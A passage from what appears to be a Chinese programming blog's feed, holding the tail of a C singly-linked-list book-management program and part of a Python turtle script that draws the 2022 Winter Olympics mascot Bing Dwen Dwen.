data-num="117"></td><td><pre>        <span class="token keyword">else</span></pre></td></tr><tr><td data-num="118"></td><td><pre>        <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="119"></td><td><pre>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"List null!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="120"></td><td><pre>            <span class="token keyword">return</span> <span class="token constant">NULL</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="121"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="122"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="123"></td><td><pre>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strcmp</span><span class="token punctuation">(</span>Bookname<span class="token punctuation">,</span>head<span class="token operator">-></span>next<span class="token operator">-></span>Bookname<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="124"></td><td><pre>    <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="125"></td><td><pre>        <span class="token keyword">if</span><span class="token punctuation">(</span>head<span class="token operator">-></span>next<span class="token operator">-></span>next <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="126"></td><td><pre>        <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="127"></td><td><pre>            pNode <span class="token operator">=</span> head<span class="token operator">-></span>next<span class="token operator">-></span>next<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="128"></td><td><pre>            head<span class="token operator">-></span>next <span class="token operator">=</span> pNode<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="129"></td><td><pre>            <span class="token keyword">return</span> head<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="130"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="131"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="132"></td><td><pre>    <span class="token keyword">while</span> <span class="token punctuation">(</span>head<span class="token operator">-></span>next<span class="token operator">-></span>next <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="133"></td><td><pre>    <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="134"></td><td><pre>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strcmp</span><span class="token punctuation">(</span>Bookname<span class="token punctuation">,</span>head<span class="token operator">-></span>next<span class="token operator">-></span>next<span class="token operator">-></span>Bookname<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="135"></td><td><pre>        <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="136"></td><td><pre>            pNode <span class="token operator">=</span> head<span class="token operator">-></span>next<span class="token operator">-></span>next<span class="token operator">-></span>next<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="137"></td><td><pre>            head<span class="token operator">-></span>next<span class="token operator">-></span>next <span class="token operator">=</span> pNode<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="138"></td><td><pre>            <span class="token keyword">return</span> head<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="139"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="140"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="141"></td><td><pre>    </pre></td></tr><tr><td data-num="142"></td><td><pre></pre></td></tr><tr><td data-num="143"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="144"></td><td><pre></pre></td></tr><tr><td data-num="145"></td><td><pre><span class="token comment">// 单链表</span></pre></td></tr><tr><td data-num="146"></td><td><pre><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="147"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="148"></td><td><pre>    <span class="token comment">// 链表头指针</span></pre></td></tr><tr><td data-num="149"></td><td><pre>    Node <span class="token operator">*</span>head <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="150"></td><td><pre>    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="151"></td><td><pre>    <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="152"></td><td><pre>        <span class="token keyword">char</span> szBookName<span class="token punctuation">[</span><span class="token number">50</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="153"></td><td><pre>        <span class="token keyword">float</span> nBookPrice <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="154"></td><td><pre>        <span class="token keyword">float</span> NewBookPrice <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="155"></td><td><pre>        <span class="token keyword">int</span> nBookNumber <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="156"></td><td><pre>        <span class="token keyword">int</span> nflag <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="157"></td><td><pre>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"请选择您要使用的功能：\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="158"></td><td><pre>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"1.添加书籍信息\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="159"></td><td><pre>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"2.查询书籍信息\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="160"></td><td><pre>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"3.修改书籍信息\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="161"></td><td><pre>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"4.删除书籍信息\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="162"></td><td><pre>        <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>nflag<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="163"></td><td><pre>        <span class="token keyword">switch</span> <span class="token punctuation">(</span>nflag<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="164"></td><td><pre>        <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="165"></td><td><pre>        <span class="token keyword">case</span> <span class="token number">1</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="166"></td><td><pre>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"请输入书名："</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="167"></td><td><pre>            <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span>szBookName<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="168"></td><td><pre>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"请输入定价："</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="169"></td><td><pre>            <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%f"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>nBookPrice<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="170"></td><td><pre>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"请输入书号："</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="171"></td><td><pre>            <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%f"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>nBookNumber<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="172"></td><td><pre>            head <span class="token operator">=</span> <span class="token function">AppendNode</span><span class="token punctuation">(</span>head<span class="token punctuation">,</span>szBookName<span class="token punctuation">,</span>nBookNumber<span class="token punctuation">,</span>nBookPrice<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="173"></td><td><pre>            <span class="token keyword">break</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="174"></td><td><pre>        <span class="token keyword">case</span> <span class="token number">2</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="175"></td><td><pre>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"请输入书名："</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="176"></td><td><pre>            <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span>szBookName<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="177"></td><td><pre>            <span class="token function">QueryNode</span><span class="token punctuation">(</span>head<span class="token punctuation">,</span>szBookName<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="178"></td><td><pre>            <span class="token keyword">break</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="179"></td><td><pre>        <span class="token keyword">case</span> <span class="token number">3</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="180"></td><td><pre>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"请输入书名："</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="181"></td><td><pre>            <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span>szBookName<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="182"></td><td><pre>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"请输入新定价："</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="183"></td><td><pre>            <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%f"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>NewBookPrice<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="184"></td><td><pre>            <span class="token function">ModeifyNode</span><span class="token punctuation">(</span>head<span class="token punctuation">,</span>szBookName<span class="token punctuation">,</span>NewBookPrice<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="185"></td><td><pre>            <span class="token keyword">break</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="186"></td><td><pre>        <span class="token keyword">case</span> <span class="token number">4</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="187"></td><td><pre>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"请输入书名："</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="188"></td><td><pre>            <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span>szBookName<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="189"></td><td><pre>            head <span class="token operator">=</span> <span class="token function">DeleteNode</span><span class="token punctuation">(</span>head<span class="token punctuation">,</span>szBookName<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="190"></td><td><pre>            <span class="token keyword">break</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="191"></td><td><pre>        <span class="token keyword">default</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="192"></td><td><pre>            <span class="token keyword">break</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="193"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="194"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="195"></td><td><pre>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="196"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>SNote</category>
      </categories>
      <tags>
        <tag>SNote</tag>
      </tags>
  </entry>
  <entry>
    <title>Just Do It For Play : bingdundun</title>
    <url>/article/60ec5e3d.html</url>
    <content><![CDATA[<p>2022 冬奥会，加油！！！</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220209190647416.png" alt="image-20220209190647416" /></p>
<p>利用 python 自带包 turtle 实现冰墩墩自由，通过 python3 执行脚本文件就可以画出一个冰墩墩哦！</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220209181501075.png" alt="image-20220209181501075" /></p>
<p><strong>脚本实例</strong></p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment"># 依赖于 python 包 turtle 实现冰墩墩自由</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token comment"># 通过 python3 执行脚本文件就可以画出一个冰墩墩哦！</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token comment"># actor：21r000</span></pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token keyword">import</span> turtle</pre></td></tr><tr><td data-num="6"></td><td><pre>turtle<span class="token punctuation">.</span>title<span class="token punctuation">(</span><span class="token string">'21r000'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token comment"># 速度</span></pre></td></tr><tr><td data-num="8"></td><td><pre>turtle<span class="token punctuation">.</span>speed<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="9"></td><td><pre></pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token comment"># 左手</span></pre></td></tr><tr><td data-num="11"></td><td><pre>turtle<span class="token punctuation">.</span>penup<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="12"></td><td><pre>turtle<span class="token punctuation">.</span>goto<span class="token punctuation">(</span><span class="token number">177</span><span class="token punctuation">,</span> <span class="token number">112</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="13"></td><td><pre>turtle<span class="token punctuation">.</span>pencolor<span class="token punctuation">(</span><span class="token string">"lightgray"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="14"></td><td><pre>turtle<span class="token punctuation">.</span>pensize<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="15"></td><td><pre>turtle<span class="token punctuation">.</span>fillcolor<span class="token punctuation">(</span><span class="token string">"white"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="16"></td><td><pre>turtle<span class="token punctuation">.</span>begin_fill<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="17"></td><td><pre>turtle<span class="token punctuation">.</span>pendown<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="18"></td><td><pre>turtle<span class="token punctuation">.</span>setheading<span class="token punctuation">(</span><span class="token number">80</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="19"></td><td><pre>turtle<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">45</span><span class="token punctuation">,</span> <span class="token number">200</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="20"></td><td><pre>turtle<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">300</span><span class="token punctuation">,</span> <span class="token number">23</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="21"></td><td><pre>turtle<span class="token punctuation">.</span>end_fill<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="22"></td><td><pre></pre></td></tr><tr><td data-num="23"></td><td><pre><span class="token comment"># 左手内</span></pre></td></tr><tr><td data-num="24"></td><td><pre>turtle<span class="token punctuation">.</span>penup<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="25"></td><td><pre>turtle<span class="token punctuation">.</span>goto<span class="token punctuation">(</span><span class="token number">182</span><span class="token punctuation">,</span> <span class="token number">95</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="26"></td><td><pre>turtle<span class="token punctuation">.</span>pencolor<span class="token punctuation">(</span><span class="token string">"black"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="27"></td><td><pre>turtle<span class="token punctuation">.</span>pensize<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="28"></td><td><pre>turtle<span class="token punctuation">.</span>fillcolor<span class="token punctuation">(</span><span class="token string">"black"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="29"></td><td><pre>turtle<span class="token punctuation">.</span>begin_fill<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="30"></td><td><pre>turtle<span class="token punctuation">.</span>setheading<span class="token punctuation">(</span><span class="token number">95</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="31"></td><td><pre>turtle<span class="token punctuation">.</span>pendown<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="32"></td><td><pre>turtle<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">37</span><span class="token punctuation">,</span> <span class="token number">160</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="33"></td><td><pre>turtle<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">20</span><span class="token punctuation">,</span> <span class="token number">50</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="34"></td><td><pre>turtle<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">200</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="35"></td><td><pre>turtle<span class="token punctuation">.</span>end_fill<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="36"></td><td><pre><span class="token comment"># 轮廓</span></pre></td></tr><tr><td data-num="37"></td><td><pre><span class="token comment"># 头顶</span></pre></td></tr><tr><td data-num="38"></td><td><pre>turtle<span class="token punctuation">.</span>penup<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="39"></td><td><pre>turtle<span class="token punctuation">.</span>goto<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">73</span><span class="token punctuation">,</span> <span class="token number">230</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="40"></td><td><pre>turtle<span class="token punctuation">.</span>pencolor<span class="token punctuation">(</span><span class="token string">"lightgray"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="41"></td><td><pre>turtle<span class="token punctuation">.</span>pensize<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="42"></td><td><pre>turtle<span class="token punctuation">.</span>fillcolor<span class="token punctuation">(</span><span class="token string">"white"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="43"></td><td><pre>turtle<span class="token punctuation">.</span>begin_fill<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="44"></td><td><pre>turtle<span class="token punctuation">.</span>pendown<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="45"></td><td><pre>turtle<span class="token punctuation">.</span>setheading<span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="46"></td><td><pre>turtle<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">250</span><span class="token punctuation">,</span> <span class="token number">35</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="47"></td><td><pre><span class="token comment"># 左耳</span></pre></td></tr><tr><td data-num="48"></td><td><pre>turtle<span class="token punctuation">.</span>setheading<span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="49"></td><td><pre>turtle<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">42</span><span class="token punctuation">,</span> <span class="token number">180</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="50"></td><td><pre><span class="token comment"># 左侧</span></pre></td></tr><tr><td data-num="51"></td><td><pre>turtle<span class="token punctuation">.</span>setheading<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">50</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="52"></td><td><pre>turtle<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">190</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="53"></td><td><pre>turtle<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">320</span><span class="token punctuation">,</span> <span class="token number">45</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="54"></td><td><pre><span class="token comment"># 左腿</span></pre></td></tr><tr><td data-num="55"></td><td><pre>turtle<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token number">120</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="56"></td><td><pre>turtle<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="57"></td><td><pre>turtle<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">18</span><span class="token punctuation">,</span> <span class="token number">85</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="58"></td><td><pre>turtle<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">180</span><span class="token punctuation">,</span> <span class="token number">23</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="59"></td><td><pre>turtle<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">20</span><span class="token punctuation">,</span> <span class="token number">110</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="60"></td><td><pre>turtle<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">115</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="61"></td><td><pre>turtle<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="62"></td><td><pre><span class="token comment"># 右腿</span></pre></td></tr><tr><td data-num="63"></td><td><pre>turtle<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">120</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="64"></td><td><pre>turtle<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">110</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="65"></td><td><pre>turtle<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">150</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="66"></td><td><pre>turtle<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">70</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="67"></td><td><pre>turtle<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">150</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="68"></td><td><pre>turtle<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span> <span class="token number">35</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="69"></td><td><pre>turtle<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">150</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="70"></td><td><pre><span class="token comment"># 右手</span></pre></td></tr><tr><td data-num="71"></td><td><pre>turtle<span class="token punctuation">.</span>setheading<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">120</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="72"></td><td><pre>turtle<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="73"></td><td><pre>turtle<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">35</span><span class="token punctuation">,</span> <span class="token number">200</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="74"></td><td><pre>turtle<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">300</span><span class="token punctuation">,</span> <span class="token number">23</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="75"></td><td><pre><span class="token comment"># 右侧</span></pre></td></tr><tr><td data-num="76"></td><td><pre>turtle<span class="token punctuation">.</span>setheading<span class="token punctuation">(</span><span class="token number">86</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="77"></td><td><pre>turtle<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">300</span><span class="token punctuation">,</span> <span class="token number">26</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="78"></td><td><pre><span class="token comment"># 右耳</span></pre></td></tr><tr><td data-num="79"></td><td><pre>turtle<span class="token punctuation">.</span>setheading<span class="token punctuation">(</span><span class="token number">122</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="80"></td><td><pre>turtle<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">53</span><span class="token punctuation">,</span> <span class="token number">160</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="81"></td><td><pre>turtle<span class="token punctuation">.</span>end_fill<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="82"></td><td><pre></pre></td></tr><tr><td data-num="83"></td><td><pre><span class="token comment"># 右耳内</span></pre></td></tr><tr><td data-num="84"></td><td><pre>turtle<span class="token punctuation">.</span>penup<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="85"></td><td><pre>turtle<span class="token punctuation">.</span>goto<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">130</span><span class="token punctuation">,</span> <span class="token number">180</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="86"></td><td><pre>turtle<span class="token punctuation">.</span>pencolor<span class="token punctuation">(</span><span class="token string">"black"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="87"></td><td><pre>turtle<span class="token punctuation">.</span>pensize<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="88"></td><td><pre>turtle<span class="token punctuation">.</span>fillcolor<span class="token punctuation">(</span><span class="token string">"black"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="89"></td><td><pre>turtle<span class="token punctuation">.</span>begin_fill<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="90"></td><td><pre>turtle<span class="token punctuation">.</span>pendown<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="91"></td><td><pre>turtle<span class="token punctuation">.</span>setheading<span class="token punctuation">(</span><span class="token number">120</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="92"></td><td><pre>turtle<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">28</span><span class="token punctuation">,</span> <span class="token number">160</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="93"></td><td><pre>turtle<span class="token punctuation">.</span>setheading<span class="token punctuation">(</span><span class="token number">210</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="94"></td><td><pre>turtle<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token number">150</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="95"></td><td><pre>turtle<span class="token punctuation">.</span>end_fill<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="96"></td><td><pre></pre></td></tr><tr><td data-num="97"></td><td><pre><span class="token comment"># 左耳内</span></pre></td></tr><tr><td data-num="98"></td><td><pre>turtle<span class="token punctuation">.</span>penup<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="99"></td><td><pre>turtle<span class="token punctuation">.</span>goto<span class="token punctuation">(</span><span class="token number">90</span><span class="token punctuation">,</span> <span class="token number">230</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="100"></td><td><pre>turtle<span class="token punctuation">.</span>setheading<span class="token punctuation">(</span><span class="token number">40</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="101"></td><td><pre>turtle<span class="token punctuation">.</span>begin_fill<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="102"></td><td><pre>turtle<span class="token punctuation">.</span>pendown<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="103"></td><td><pre>turtle<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token 